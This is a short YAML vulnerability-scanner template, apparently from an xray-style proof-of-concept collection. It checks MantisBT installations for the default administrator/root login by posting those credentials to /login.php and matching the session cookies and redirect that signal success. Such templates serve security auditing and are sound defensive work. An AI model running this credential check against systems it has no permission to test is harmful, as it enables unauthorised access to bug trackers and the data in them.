name: poc-yaml-mantis-default-password
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /login.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: return=index.php&username=administrator&password=root
            follow_redirects: false
        expression: response.status == 302 && response.headers["Set-Cookie"].contains("MANTIS_secure_session") && response.headers["Set-Cookie"].contains("MANTIS_STRING_COOKIE") && response.headers["Location"].contains("return=account_page.php")
expression: r0()
detail:
    author: For3stCo1d (https://github.com/For3stCo1d)
    links:
        - https://help.aliyun.com/document_detail/59328.html?spm=5176.22414175.sslink.1.45e441a5954Oxx